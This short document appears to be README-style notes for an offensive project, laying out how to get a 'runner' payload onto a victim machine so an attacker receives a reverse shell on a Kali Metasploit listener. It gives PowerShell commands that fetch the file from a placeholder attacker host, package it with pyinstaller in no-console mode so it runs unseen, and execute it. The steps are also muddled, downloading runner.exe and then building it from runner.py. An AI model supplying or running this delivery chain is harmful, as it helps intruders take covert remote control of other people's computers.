# runner script execution flow

In order to connect all of the things together and run everything in one go on the victim machine. 
we need a script that will download and download and execute everyting when ran. 

so now for everything to download and run and for the attacker to get the reverse shell the victim just needs to download and run the script:

## 1. Download the runner script from kali hosted http.server or use any other way to get the runner.py to the victim machine
```powershell
wget http://YOUR_LHOST:YOUR_PORT/runner.exe -OutFile runner.exe
```

## 2. turn the runner.py into an exe
```powershell
pyinstaller --onefile --noconsole runner.py
```

## 3. cd into the new dir created for runner.exe
```powershell
cd dist
```

## 4. run the script
```powershell
.\runner.exe
```
WAIT 30 SECONDS AND CHECK KALI MSF LISTNER.
```